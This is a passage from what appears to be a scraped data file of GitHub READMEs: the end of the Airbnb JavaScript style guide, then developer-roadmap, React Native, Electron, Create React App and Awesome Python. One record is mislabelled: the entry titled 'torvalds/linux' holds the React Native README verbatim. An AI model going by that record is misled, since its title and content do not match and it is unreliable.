bad\n$('ul', '.sidebar').hide();\n\n// bad\n$('.sidebar').find('ul').hide();\n\n// good\n$('.sidebar ul').hide();\n\n// good\n$('.sidebar > ul').hide();\n\n// good\n$sidebar.find('ul').hide();\n\n\n\u2b06 back to top\nECMAScript 5 Compatibility\n\n\n27.1 Refer to Kangax\u2019s ES5 compatibility table.\n\n\u2b06 back to top\n\nECMAScript 6+ (ES 2015+) Styles\n\n\n28.1 This is a collection of links to the various ES6+ features.\n\n\nArrow Functions\nClasses\nObject Shorthand\nObject Concise\nObject Computed Properties\nTemplate Strings\nDestructuring\nDefault Parameters\nRest\nArray Spreads\nLet and Const\nExponentiation Operator\nIterators and Generators\nModules\n\n\n\n\n28.2 Do not use TC39 proposals that have not reached stage 3.\n\nWhy? They are not finalized, and they are subject to change or to be withdrawn entirely. We want to use JavaScript, and proposals are not JavaScript yet.\n\n\n\n\u2b06 back to top\nStandard Library\nThe Standard Library\ncontains utilities that are functionally broken but remain for legacy reasons.\n\n\n\n29.1 Use Number.isNaN instead of global isNaN.\neslint: no-restricted-globals\n\nWhy? The global isNaN coerces non-numbers to numbers, returning true for anything that coerces to NaN.\nIf this behavior is desired, make it explicit.\n\n// bad\nisNaN('1.2'); // false\nisNaN('1.2.3'); // true\n\n// good\nNumber.isNaN('1.2.3'); // false\nNumber.isNaN(Number('1.2.3')); // true\n\n\n\n\n\n29.2 Use Number.isFinite instead of global isFinite.\neslint: no-restricted-globals\n\nWhy? The global isFinite coerces non-numbers to numbers, returning true for anything that coerces to a finite number.\nIf this behavior is desired, make it explicit.\n\n// bad\nisFinite('2e3'); // true\n\n// good\nNumber.isFinite('2e3'); // false\nNumber.isFinite(parseInt('2e3', 10)); // true\n\n\n\u2b06 back to top\nTesting\n\n\n\n30.1 Yup.\nfunction foo() {\n  return true;\n}\n\n\n\n\n30.2 No, but seriously:\n\nWhichever testing framework you use, you should be writing tests!\nStrive to write many small pure functions, and minimize where mutations occur.\nBe cautious about stubs and mocks - they can make your tests more brittle.\nWe primarily use mocha and jest at Airbnb. tape is also used occasionally for small, separate modules.\n100% test coverage is a good goal to strive for, even if it\u2019s not always practical to reach it.\nWhenever you fix a bug, write a regression test. A bug fixed without a regression test is almost certainly going to break again in the future.\n\n\n\n\u2b06 back to top\nPerformance\n\nOn Layout & Web Performance\nString vs Array Concat\nTry/Catch Cost In a Loop\nBang Function\njQuery Find vs Context, Selector\ninnerHTML vs textContent for script text\nLong String Concatenation\nAre Javascript functions like map(), reduce(), and filter() optimized for traversing arrays?\nLoading...\n\n\u2b06 back to top\nResources\nLearning ES6+\n\nLatest ECMA spec\nExploringJS\nES6 Compatibility Table\nComprehensive Overview of ES6 Features\n\nRead This\n\nStandard ECMA-262\n\nTools\n\nCode Style Linters\n\nESlint - Airbnb Style .eslintrc\nJSHint - Airbnb Style .jshintrc\n\n\nNeutrino Preset - @neutrinojs/airbnb\n\nOther Style Guides\n\nGoogle JavaScript Style Guide\njQuery Core Style Guidelines\nPrinciples of Writing Consistent, Idiomatic JavaScript\nStandardJS\n\nOther Styles\n\nNaming this in nested functions - Christian Johansen\nConditional Callbacks - Ross Allen\nPopular JavaScript Coding Conventions on GitHub - JeongHoon Byun\nMultiple var statements in JavaScript, not superfluous - Ben Alman\n\nFurther Reading\n\nUnderstanding JavaScript Closures - Angus Croll\nBasic JavaScript for the impatient programmer - Dr. Axel Rauschmayer\nYou Might Not Need jQuery - Zack Bloom & Adam Schwartz\nES6 Features - Luke Hoban\nFrontend Guidelines - Benjamin De Cock\n\nBooks\n\nJavaScript: The Good Parts - Douglas Crockford\nJavaScript Patterns - Stoyan Stefanov\nPro JavaScript Design Patterns  - Ross Harmes and Dustin Diaz\nHigh Performance Web Sites: Essential Knowledge for Front-End Engineers - Steve Souders\nMaintainable JavaScript - Nicholas C. Zakas\nJavaScript Web Applications - Alex MacCaw\nPro JavaScript Techniques - John Resig\nSmashing Node.js: JavaScript Everywhere - Guillermo Rauch\nSecrets of the JavaScript Ninja - John Resig and Bear Bibeault\nHuman JavaScript - Henrik Joreteg\nSuperhero.js - Kim Joar Bekkelund, Mads Mob\u00e6k, & Olav Bjorkoy\nJSBooks - Julien Bouquillon\nThird Party JavaScript - Ben Vinegar and Anton Kovalyov\nEffective JavaScript: 68 Specific Ways to Harness the Power of JavaScript - David Herman\nEloquent JavaScript - Marijn Haverbeke\nYou Don\u2019t Know JS: ES6 & Beyond - Kyle Simpson\n\nBlogs\n\nJavaScript Weekly\nJavaScript, JavaScript...\nBocoup Weblog\nAdequately Good\nNCZOnline\nPerfection Kills\nBen Alman\nDmitry Baranovskiy\nnettuts\n\nPodcasts\n\nJavaScript Air\nJavaScript Jabber\n\n\u2b06 back to top\nIn the Wild\nThis is a list of organizations that are using this style guide. Send us a pull request and we'll add you to the list.\n\n123erfasst: 123erfasst/javascript\n3blades: 3Blades\n4Catalyzer: 4Catalyzer/javascript\nAan Zee: AanZee/javascript\nAdult Swim: adult-swim/javascript\nAirbnb: airbnb/javascript\nAltSchool: AltSchool/javascript\nApartmint: apartmint/javascript\nAscribe: ascribe/javascript\nAvalara: avalara/javascript\nAvant: avantcredit/javascript\nAxept: axept/javascript\nBashPros: BashPros/javascript\nBillabong: billabong/javascript\nBisk: bisk\nBonhomme: bonhommeparis/javascript\nBrainshark: brainshark/javascript\nCaseNine: CaseNine/javascript\nCerner: Cerner\nChartboost: ChartBoost/javascript-style-guide\nComparaOnline: comparaonline/javascript\nCompass Learning: compasslearning/javascript-style-guide\nDailyMotion: dailymotion/javascript\nDoSomething: DoSomething/eslint-config\nDigitpaint digitpaint/javascript\nDrupal: www.drupal.org\nEcosia: ecosia/javascript\nEvernote: evernote/javascript-style-guide\nEvolution Gaming: evolution-gaming/javascript\nEvozonJs: evozonjs/javascript\nExactTarget: ExactTarget/javascript\nExpensify Expensify/Style-Guide\nFlexberry: Flexberry/javascript-style-guide\nGawker Media: gawkermedia\nGeneral Electric: GeneralElectric/javascript\nGeneration Tux: GenerationTux/javascript\nGoodData: gooddata/gdc-js-style\nGreenChef: greenchef/javascript\nGrooveshark: grooveshark/javascript\nGrupo-Abraxas: Grupo-Abraxas/javascript\nHoney: honeyscience/javascript\nHow About We: howaboutwe/javascript\nHuballin: huballin\nHubSpot: HubSpot/javascript\nHyper: hyperoslo/javascript-playbook\nInterCity Group: intercitygroup/javascript-style-guide\nJam3: Jam3/Javascript-Code-Conventions\nJeopardyBot: kesne/jeopardy-bot\nJSSolutions: JSSolutions/javascript\nKaplan Komputing: kaplankomputing/javascript\nKickorStick: kickorstick\nKinetica Solutions: kinetica/javascript\nLEINWAND: LEINWAND/javascript\nLonely Planet: lonelyplanet/javascript\nM2GEN: M2GEN/javascript\nMighty Spring: mightyspring/javascript\nMinnPost: MinnPost/javascript\nMitocGroup: MitocGroup/javascript\nModCloth: modcloth/javascript\nMoney Advice Service: moneyadviceservice/javascript\nMuber: muber\nNational Geographic: natgeo\nNimbl3: nimbl3/javascript\nNullDev: NullDevCo/JavaScript-Styleguide\nNulogy: nulogy/javascript\nOrange Hill Development: orangehill/javascript\nOrion Health: orionhealth/javascript\nOutBoxSoft: OutBoxSoft/javascript\nPeerby: Peerby/javascript\nPier 1: Pier1/javascript\nQotto: Qotto/javascript-style-guide\nRazorfish: razorfish/javascript-style-guide\nreddit: reddit/styleguide/javascript\nReact: facebook.github.io/react/contributing/how-to-contribute.html#style-guide\nREI: reidev/js-style-guide\nRipple: ripple/javascript-style-guide\nSainsbury\u2019s Supermarkets: jsainsburyplc\nSeekingAlpha: seekingalpha/javascript-style-guide\nShutterfly: shutterfly/javascript\nSourcetoad: sourcetoad/javascript\nSpringload: springload\nStratoDem Analytics: stratodem/javascript\nSteelKiwi Development: steelkiwi/javascript\nStudentSphere: studentsphere/javascript\nSwoopApp: swoopapp/javascript\nSysGarage: sysgarage/javascript-style-guide\nSyzygy Warsaw: syzygypl/javascript\nTarget: target/javascript\nTerra: terra\nTheLadders: TheLadders/javascript\nThe Nerdery: thenerdery/javascript-standards\nT4R Technology: T4R-Technology/javascript\nUrbanSim: urbansim\nVoxFeed: VoxFeed/javascript-style-guide\nWeBox Studio: weboxstudio/javascript\nWeggo: Weggo/javascript\nZillow: zillow/javascript\nZocDoc: ZocDoc/javascript\n\n\u2b06 back to top\nTranslation\nThis style guide is also available in other languages:\n\n Brazilian Portuguese: armoucar/javascript-style-guide\n Bulgarian: borislavvv/javascript\n Catalan: fpmweb/javascript-style-guide\n Chinese (Simplified): lin-123/javascript\n Chinese (Traditional): jigsawye/javascript\n French: nmussy/javascript-style-guide\n German: timofurrer/javascript-style-guide\n Italian: sinkswim/javascript-style-guide\n Japanese: mitsuruog/javascript-style-guide\n Korean: ParkSB/javascript-style-guide\n Russian: leonidlebedev/javascript-airbnb\n Spanish: paolocarrasco/javascript-style-guide\n Thai: lvarayut/javascript-style-guide\n Turkish: eraycetinay/javascript\n Ukrainian: ivanzusko/javascript\n Vietnam: dangkyokhoang/javascript-style-guide\n\nThe JavaScript Style Guide Guide\n\nReference\n\nChat With Us About JavaScript\n\nFind us on gitter.\n\nContributors\n\nView Contributors\n\nLicense\n(The MIT License)\nCopyright (c) 2012 Airbnb\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n'Software'), to deal in the Software without restriction, including\nwithout limitation the rights to use, copy, modify, merge, publish,\ndistribute, sublicense, and/or sell copies of the Software, and to\npermit persons to whom the Software is furnished to do so, subject to\nthe following conditions:\nThe above copyright notice and this permission notice shall be\nincluded in all copies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND,\nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.\nIN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY\nCLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,\nTORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE\nSOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\u2b06 back to top\nAmendments\nWe encourage you to fork this guide and change the rules to fit your team\u2019s style guide. Below, you may list some amendments to the style guide. This allows you to periodically update your style guide without having to deal with merge conflicts.\n};"}, {"title": "kamranahmedse/developer-roadmap", "language": "JavaScript", "content": "Roadmap to becoming a web developer in 2019\n\nBelow you find a set of charts demonstrating the paths that you can take and the technologies that you would want to adopt in order to become a frontend, backend or a devops. I made these charts for an old professor of mine who wanted something to share with his college students to give them a perspective; sharing them here to help the community.\nIf you think that these can be improved in anyway, please do suggest.\n\n \ud83c\udf89 We are working on a more concise version of these roadmaps \ud83c\udf89 Keep your eyes on roadmap.sh for the details!\n\n\nThe purpose of these roadmaps is to give you an idea about the landscape and to guide you if you are confused about what to learn next and not to encourage you to pick what is hip and trendy. You should grow some understanding of why one tool would better suited for some cases than the other and remember hip and trendy never means best suited for the job\n\nIntroduction\n\nFrontend Roadmap\n\nBack-end Roadmap\n\nDevOps Roadmap\n\n\ud83d\udea6 Wrap Up\nIf you think any of the roadmaps can be improved, please do open a PR with any updates and submit any issues. Also, I will continue to improve this, so you might want to watch/star this repository to revisit.\n\ud83d\ude4c Contribution\n\nHave a look at contribution docs for how to update any of the roadmaps\n\n\nOpen pull request with improvements\nDiscuss ideas in issues\nSpread the word\nReach out with any feedback \n\nSponsored By\n\nHackr.io - Best Online Programming Courses & Tutorials Recommended by the Programming Community\nNoon \u2013 Develop, Document, Test and Monitor your APIs\n\nLicense"}, {"title": "facebook/react-native", "language": "JavaScript", "content": "React Native\n  \n\n\nLearn once, write anywhere:\n  Build mobile apps with React.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nGetting Started\n \u00b7 \nLearn the Basics\n \u00b7 \nShowcase\n \u00b7 \nContribute\n \u00b7 \nCommunity\n \u00b7 \nSupport\n\nReact Native brings React's declarative UI framework to iOS and Android. With React Native, you use native UI controls and have full access to the native platform.\n\nDeclarative. React makes it painless to create interactive UIs. Declarative views make your code more predictable and easier to debug.\nComponent-Based. Build encapsulated components that manage their own state, then compose them to make complex UIs.\nDeveloper Velocity. See local changes in seconds. Changes to JavaScript code can be live reloaded without rebuilding the native app.\nPortability. Reuse code across iOS, Android, and other platforms.\n\nReact Native is developed and supported by many companies and individual core contributors. Find out more in our ecosystem overview.\nContents\n\nRequirements\nBuilding your first React Native app\nDocumentation\nUpgrading\nHow to Contribute\nCode of Conduct\nLicense\n\n\ud83d\udccb Requirements\nReact Native apps may target iOS 9.0 and Android 4.1 (API 16) or newer. You may use Windows, macOS, or Linux as your development operating system, though building and running iOS apps is limited to macOS. Tools like Expo can be used to work around this.\n\ud83c\udf89 Building your first React Native app\nFollow the Getting Started guide. The recommended way to install React Native depends on your project. Here you can find short guides for the most common scenarios:\n\nTrying out React Native\nCreating a New Application\nAdding React Native to an Existing Application\n\n\ud83d\udcd6 Documentation\nThe full documentation for React Native can be found on our website.\nThe React Native documentation discusses components, APIs, and topics that are specific to React Native. For further documentation on the React API that is shared between React Native and React DOM, refer to the React documentation.\nThe source for the React Native documentation and website is hosted on a separate repo, @facebook/react-native-website.\n\ud83d\ude80 Upgrading\nUpgrading to new versions of React Native may give you access to more APIs, views, developer tools and other goodies. See the Upgrading Guide for instructions.\nReact Native releases are discussed in the React Native Community, @react-native-community/react-native-releases.\n\ud83d\udc4f How to Contribute\nThe main purpose of this repository is to continue evolving React Native core. We want to make contributing to this project as easy and transparent as possible, and we are grateful to the community for contributing bugfixes and improvements. Read below to learn how you can take part in improving React Native.\nCode of Conduct\nFacebook has adopted a Code of Conduct that we expect project participants to adhere to.\nPlease read the full text so that you can understand what actions will and will not be tolerated.\nContributing Guide\nRead our Contributing Guide to learn about our development process, how to propose bugfixes and improvements, and how to build and test your changes to React Native.\nOpen Source Roadmap\nYou can learn more about our vision for React Native in the Roadmap.\nGood First Issues\nWe have a list of good first issues that contain bugs which have a relatively limited scope. This is a great place to get started, gain experience, and get familiar with our contribution process.\nDiscussions\nLarger discussions and proposals are discussed in @react-native-community/discussions-and-proposals.\n\ud83d\udcc4 License\nReact Native is MIT licensed, as found in the LICENSE file.\nReact Native documentation is Creative Commons licensed, as found in the LICENSE-docs file."}, {"title": "torvalds/linux", "language": "C", "content": "React Native\n  \n\n\nLearn once, write anywhere:\n  Build mobile apps with React.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nGetting Started\n \u00b7 \nLearn the Basics\n \u00b7 \nShowcase\n \u00b7 \nContribute\n \u00b7 \nCommunity\n \u00b7 \nSupport\n\nReact Native brings React's declarative UI framework to iOS and Android. With React Native, you use native UI controls and have full access to the native platform.\n\nDeclarative. React makes it painless to create interactive UIs. Declarative views make your code more predictable and easier to debug.\nComponent-Based. Build encapsulated components that manage their own state, then compose them to make complex UIs.\nDeveloper Velocity. See local changes in seconds. Changes to JavaScript code can be live reloaded without rebuilding the native app.\nPortability. Reuse code across iOS, Android, and other platforms.\n\nReact Native is developed and supported by many companies and individual core contributors. Find out more in our ecosystem overview.\nContents\n\nRequirements\nBuilding your first React Native app\nDocumentation\nUpgrading\nHow to Contribute\nCode of Conduct\nLicense\n\n\ud83d\udccb Requirements\nReact Native apps may target iOS 9.0 and Android 4.1 (API 16) or newer. You may use Windows, macOS, or Linux as your development operating system, though building and running iOS apps is limited to macOS. Tools like Expo can be used to work around this.\n\ud83c\udf89 Building your first React Native app\nFollow the Getting Started guide. The recommended way to install React Native depends on your project. Here you can find short guides for the most common scenarios:\n\nTrying out React Native\nCreating a New Application\nAdding React Native to an Existing Application\n\n\ud83d\udcd6 Documentation\nThe full documentation for React Native can be found on our website.\nThe React Native documentation discusses components, APIs, and topics that are specific to React Native. For further documentation on the React API that is shared between React Native and React DOM, refer to the React documentation.\nThe source for the React Native documentation and website is hosted on a separate repo, @facebook/react-native-website.\n\ud83d\ude80 Upgrading\nUpgrading to new versions of React Native may give you access to more APIs, views, developer tools and other goodies. See the Upgrading Guide for instructions.\nReact Native releases are discussed in the React Native Community, @react-native-community/react-native-releases.\n\ud83d\udc4f How to Contribute\nThe main purpose of this repository is to continue evolving React Native core. We want to make contributing to this project as easy and transparent as possible, and we are grateful to the community for contributing bugfixes and improvements. Read below to learn how you can take part in improving React Native.\nCode of Conduct\nFacebook has adopted a Code of Conduct that we expect project participants to adhere to.\nPlease read the full text so that you can understand what actions will and will not be tolerated.\nContributing Guide\nRead our Contributing Guide to learn about our development process, how to propose bugfixes and improvements, and how to build and test your changes to React Native.\nOpen Source Roadmap\nYou can learn more about our vision for React Native in the Roadmap.\nGood First Issues\nWe have a list of good first issues that contain bugs which have a relatively limited scope. This is a great place to get started, gain experience, and get familiar with our contribution process.\nDiscussions\nLarger discussions and proposals are discussed in @react-native-community/discussions-and-proposals.\n\ud83d\udcc4 License\nReact Native is MIT licensed, as found in the LICENSE file.\nReact Native documentation is Creative Commons licensed, as found in the LICENSE-docs file."}, {"title": "electron/electron", "language": "C++", "content": "\ud83d\udcdd Available Translations: \ud83c\udde8\ud83c\uddf3 \ud83c\uddf9\ud83c\uddfc \ud83c\udde7\ud83c\uddf7 \ud83c\uddea\ud83c\uddf8 \ud83c\uddf0\ud83c\uddf7 \ud83c\uddef\ud83c\uddf5 \ud83c\uddf7\ud83c\uddfa \ud83c\uddeb\ud83c\uddf7 \ud83c\uddf9\ud83c\udded \ud83c\uddf3\ud83c\uddf1 \ud83c\uddf9\ud83c\uddf7 \ud83c\uddee\ud83c\udde9 \ud83c\uddfa\ud83c\udde6 \ud83c\udde8\ud83c\uddff \ud83c\uddee\ud83c\uddf9 \ud83c\uddf5\ud83c\uddf1.\nView these docs in other languages at electron/i18n.\nThe Electron framework lets you write cross-platform desktop applications\nusing JavaScript, HTML and CSS. It is based on Node.js and\nChromium and is used by the Atom\neditor and many other apps.\nFollow @ElectronJS on Twitter for important\nannouncements.\nThis project adheres to the Contributor Covenant\ncode of conduct.\nBy participating, you are expected to uphold this code. Please report unacceptable\nbehavior to coc@electronjs.org.\nInstallation\nTo install prebuilt Electron binaries, use npm.\nThe preferred method is to install Electron as a development dependency in your\napp:\nnpm install electron --save-dev [--save-exact]\nThe --save-exact flag is recommended for Electron prior to version 2, as it does not follow semantic\nversioning. As of version 2.0.0, Electron follows semver, so you don't need --save-exact flag. For info on how to manage Electron versions in your apps, see\nElectron versioning.\nFor more installation options and troubleshooting tips, see\ninstallation.\nQuick start & Electron Fiddle\nUse Electron Fiddle\nto build, run, and package small Electron experiments, to see code examples for all of Electron's APIs, and\nto try out different versions of Electron. It's designed to make the start of your journey with\nElectron easier.\nAlternatively, clone and run the\nelectron/electron-quick-start\nrepository to see a minimal Electron app in action:\ngit clone https://github.com/electron/electron-quick-start\ncd electron-quick-start\nnpm install\nnpm start\nResources for learning Electron\n\nelectronjs.org/docs - all of Electron's documentation\nelectron/fiddle - A tool to build, run, and package small Electron experiments\nelectron/electron-quick-start - a very basic starter Electron app\nelectronjs.org/community#boilerplates - sample starter apps created by the community\nelectron/simple-samples - small applications with ideas for taking them further\nelectron/electron-api-demos - an Electron app that teaches you how to use Electron\nhokein/electron-sample-apps - small demo apps for the various Electron APIs\n\nProgrammatic usage\nMost people use Electron from the command line, but if you require electron inside\nyour Node app (not your Electron app) it will return the file path to the\nbinary. Use this to spawn Electron from Node scripts:\nconst electron = require('electron')\nconst proc = require('child_process')\n\n// will print something similar to /Users/maf/.../Electron\nconsole.log(electron)\n\n// spawn Electron\nconst child = proc.spawn(electron)\nMirrors\n\nChina\n\nDocumentation Translations\nFind documentation translations in electron/i18n.\nContributing\nIf you are interested in reporting/fixing issues and contributing directly to the code base, please see CONTRIBUTING.md for more information on what we're looking for and how to get started.\nCommunity\nInfo on reporting bugs, getting help, finding third-party tools and sample apps,\nand more can be found in the support document.\nLicense\nMIT\nWhen using the Electron or other GitHub logos, be sure to follow the GitHub logo guidelines."}, {"title": "facebook/create-react-app", "language": "JavaScript", "content": "Create React App  \nCreate React apps with no build configuration.\n\nCreating an App \u2013 How to create a new app.\nUser Guide \u2013 How to develop apps bootstrapped with Create React App.\n\nCreate React App works on macOS, Windows, and Linux.\nIf something doesn\u2019t work, please file an issue.\nQuick Overview\nnpx create-react-app my-app\ncd my-app\nnpm start\n(npx comes with npm 5.2+ and higher, see instructions for older npm versions)\nThen open http://localhost:3000/ to see your app.\nWhen you\u2019re ready to deploy to production, create a minified bundle with npm run build.\n\n\n\nGet Started Immediately\nYou don\u2019t need to install or configure tools like Webpack or Babel.\nThey are preconfigured and hidden so that you can focus on the code.\nJust create a project, and you\u2019re good to go.\nCreating an App\nYou\u2019ll need to have Node 8.10.0 or later on your local development machine (but it\u2019s not required on the server). You can use nvm (macOS/Linux) or nvm-windows to easily switch Node versions between different projects.\nTo create a new app, you may choose one of the following methods:\nnpx\nnpx create-react-app my-app\n(npx comes with npm 5.2+ and higher, see instructions for older npm versions)\nnpm\nnpm init react-app my-app\nnpm init <initializer> is available in npm 6+\nYarn\nyarn create react-app my-app\nyarn create is available in Yarn 0.25+\nIt will create a directory called my-app inside the current folder.\nInside that directory, it will generate the initial project structure and install the transitive dependencies:\nmy-app\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 node_modules\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 .gitignore\n\u251c\u2500\u2500 public\n\u2502   \u251c\u2500\u2500 favicon.ico\n\u2502   \u251c\u2500\u2500 index.html\n\u2502   \u2514\u2500\u2500 manifest.json\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 App.css\n    \u251c\u2500\u2500 App.js\n    \u251c\u2500\u2500 App.test.js\n    \u251c\u2500\u2500 index.css\n    \u251c\u2500\u2500 index.js\n    \u251c\u2500\u2500 logo.svg\n    \u2514\u2500\u2500 serviceWorker.js\n\nNo configuration or complicated folder structures, just the files you need to build your app.\nOnce the installation is done, you can open your project folder:\ncd my-app\nInside the newly created project, you can run some built-in commands:\nnpm start or yarn start\nRuns the app in development mode.\nOpen http://localhost:3000 to view it in the browser.\nThe page will automatically reload if you make changes to the code.\nYou will see the build errors and lint warnings in the console.\n\n\n\nnpm test or yarn test\nRuns the test watcher in an interactive mode.\nBy default, runs tests related to files changed since the last commit.\nRead more about testing.\nnpm run build or yarn build\nBuilds the app for production to the build folder.\nIt correctly bundles React in production mode and optimizes the build for the best performance.\nThe build is minified and the filenames include the hashes.\nYour app is ready to be deployed.\nUser Guide\nYou can find detailed instructions on using Create React App and many tips in its documentation.\nHow to Update to New Versions?\nPlease refer to the User Guide for this and other information.\nPhilosophy\n\n\nOne Dependency: There is just one build dependency. It uses Webpack, Babel, ESLint, and other amazing projects, but provides a cohesive curated experience on top of them.\n\n\nNo Configuration Required: You don't need to configure anything. A reasonably good configuration of both development and production builds is handled for you so you can focus on writing code.\n\n\nNo Lock-In: You can \u201ceject\u201d to a custom setup at any time. Run a single command, and all the configuration and build dependencies will be moved directly into your project, so you can pick up right where you left off.\n\n\nWhat\u2019s Included?\nYour environment will have everything you need to build a modern single-page React app:\n\nReact, JSX, ES6, TypeScript and Flow syntax support.\nLanguage extras beyond ES6 like the object spread operator.\nAutoprefixed CSS, so you don\u2019t need -webkit- or other prefixes.\nA fast interactive unit test runner with built-in support for coverage reporting.\nA live development server that warns about common mistakes.\nA build script to bundle JS, CSS, and images for production, with hashes and sourcemaps.\nAn offline-first service worker and a web app manifest, meeting all the Progressive Web App criteria. (Note: Using the service worker is opt-in as of react-scripts@2.0.0 and higher)\nHassle-free updates for the above tools with a single dependency.\n\nCheck out this guide for an overview of how these tools fit together.\nThe tradeoff is that these tools are preconfigured to work in a specific way. If your project needs more customization, you can \"eject\" and customize it, but then you will need to maintain this configuration.\nPopular Alternatives\nCreate React App is a great fit for:\n\nLearning React in a comfortable and feature-rich development environment.\nStarting new single-page React applications.\nCreating examples with React for your libraries and components.\n\nHere are a few common cases where you might want to try something else:\n\n\nIf you want to try React without hundreds of transitive build tool dependencies, consider using a single HTML file or an online sandbox instead.\n\n\nIf you need to integrate React code with a server-side template framework like Rails, Django or Symfony, or if you\u2019re not building a single-page app, consider using nwb, or Neutrino which are more flexible. For Rails specifically, you can use Rails Webpacker. For Symfony, try Symfony's Webpack Encore.\n\n\nIf you need to publish a React component, nwb can also do this, as well as Neutrino's react-components preset.\n\n\nIf you want to do server rendering with React and Node.js, check out Next.js or Razzle. Create React App is agnostic of the backend, and just produces static HTML/JS/CSS bundles.\n\n\nIf your website is mostly static (for example, a portfolio or a blog), consider using Gatsby instead. Unlike Create React App, it pre-renders the website into HTML at the build time.\n\n\nFinally, if you need more customization, check out Neutrino and its React preset.\n\n\nAll of the above tools can work with little to no configuration.\nIf you prefer configuring the build yourself, follow this guide.\nContributing\nWe'd love to have your helping hand on create-react-app! See CONTRIBUTING.md for more information on what we're looking for and how to get started.\nReact Native\nLooking for something similar, but for React Native?\nCheck out Expo CLI.\nAcknowledgements\nWe are grateful to the authors of existing related projects for their ideas and collaboration:\n\n@eanplatter\n@insin\n@mxstbr\n\nLicense\nCreate React App is open source software licensed as MIT."}, {"title": "vinta/awesome-python", "language": "Python", "content": "Awesome Python \nA curated list of awesome Python frameworks, libraries, software and resources.\nInspired by awesome-php.\n\nAwesome Python\n\nAdmin Panels\nAlgorithms and Design Patterns\nAudio\nAuthentication\nBuild Tools\nBuilt-in Classes Enhancement\nCaching\nChatOps Tools\nCMS\nCode Analysis\nCommand-line Tools\nCompatibility\nComputer Vision\nConcurrency and Parallelism\nConfiguration\nCryptography\nData Analysis\nData Validation\nData Visualization\nDatabase Drivers\nDatabase\nDate and Time\nDebugging Tools\nDeep Learning\nDevOps Tools\nDistributed Computing\nDistribution\nDocumentation\nDownloader\nE-commerce\nEditor Plugins and IDEs\nEmail\nEnvironment Management\nFiles\nForeign Function Interface\nForms\nFunctional Programming\nGame Development\nGeolocation\nGUI\nHardware\nHTML Manipulation\nHTTP\nImage Processing\nImplementations\nInteractive Interpreter\nInternationalization\nJob Scheduler\nLogging\nMachine Learning\nMiscellaneous\nNatural Language Processing\nNetwork Virtualization\nNetworking\nNews Feed\nORM\nPackage Management\nPackage Repositories\nPermissions\nProcesses\nQueue\nRecommender Systems\nRESTful API\nRobotics\nRPC Servers\nScience\nSearch\nSerialization\nServerless Frameworks\nSpecific Formats Processing\nStatic Site Generator\nTagging\nTemplate Engine\nTesting\nText Processing\nThird-party APIs\nURL Manipulation\nVideo\nWeb Asset Management\nWeb Content Extracting\nWeb Crawling & Web Scraping\nWeb Frameworks\nWebSocket\nWSGI Servers\n\n\nServices\n\nCode Quality\nContinuous Integration\n\n\nResources\n\nPodcasts\nTwitter\nWebsites\nWeekly\n\n\nOther Awesome Lists\nContributing\n\n\nAdmin Panels\nLibraries for administrative interfaces.\n\najenti - The admin panel your servers deserve.\ndjango-grappelli - A jazzy skin for the Django Admin-Interface.\ndjango-suit - Alternative Django Admin-Interface (free only for Non-commercial use).\ndjango-xadmin - Drop-in replacement of Django admin comes with lots of goodies.\nflask-admin - Simple and extensible administrative interface framework for Flask.\nflower - Real-time monitor and web admin for Celery.\nwooey - A Django app which creates automatic web UIs for Python scripts.\n\nAlgorithms and Design Patterns\nPython implementation of algorithms and design patterns.\n\nalgorithms - Minimal examples of data structures and algorithms in Python.\nPyPattyrn - A simple yet effective library for implementing common design patterns.\npython-patterns - A collection of design patterns in Python.\nsortedcontainers - Fast, pure-Python implementation of SortedList, SortedDict, and SortedSet types.\n\nAudio\nLibraries for manipulating audio and its metadata.\n\nAudio\n\naudioread - Cross-library (GStreamer + Core Audio + MAD + FFmpeg) audio decoding.\ndejavu - Audio fingerprinting and recognition.\nmingus - An advanced music theory and notation package with MIDI file and playback support.\npyAudioAnalysis - Python Audio Analysis Library: Feature Extraction, Classification, Segmentation and Applications\npydub - Manipulate audio with a simple and easy high level interface.\nTimeSide - Open web audio processing framework.\n\n\nMetadata\n\nbeets - A music library manager and MusicBrainz tagger.\neyeD3 - A tool for working with audio files, specifically MP3 files containing ID3 metadata.\nmutagen - A Python module to handle audio metadata.\ntinytag - A library for reading music meta data of MP3, OGG, FLAC and Wave files.\n\n\n\nAuthentication\nLibraries for implementing authentications schemes.\n\nOAuth\n\nauthlib - JavaScript Object Signing and Encryption draft implementation.\ndjango-allauth - Authentication app for Django that \"just works.\"\ndjango-oauth-toolkit - OAuth 2 goodies for Django.\noauthlib - A generic and thorough implementation of the OAuth request-signing logic.\npython-oauth2 - A fully tested, abstract interface to creating OAuth clients and servers.\npython-social-auth - An easy-to-setup social authentication mechanism.\n\n\nJWT\n\npyjwt - JSON Web Token implementation in Python.\npython-jose - A JOSE implementation in Python.\npython-jwt - A module for generating and verifying JSON Web Tokens.\n\n\n\nBuild Tools\nCompile software from source code.\n\nBitBake - A make-like build tool for embedded Linux.\nbuildout - A build system for creating, assembling and deploying applications from multiple parts.\nPlatformIO - A console tool to build code with different development platforms.\npybuilder - A continuous build tool written in pure Python.\nSCons - A software construction tool.\n\nBuilt-in Classes Enhancement\nLibraries for enhancing Python built-in classes.\n\ndataclasses - (Python standard library) Data classes.\nattrs - Replacement for __init__, __eq__, __repr__, etc. boilerplate in class definitions.\nbidict - Efficient, Pythonic bidirectional map data structures and related functionality..\nBox - Python dictionaries with advanced dot notation access.\nDottedDict - A library that provides a method of accessing lists and dicts with a dotted path notation.\n\nCMS\nContent Management Systems.\n\nwagtail - A Django content management system.\ndjango-cms - An Open source enterprise CMS based on the Django.\nfeincms - One of the most advanced Content Management Systems built on Django.\nKotti - A high-level, Pythonic web application framework built on 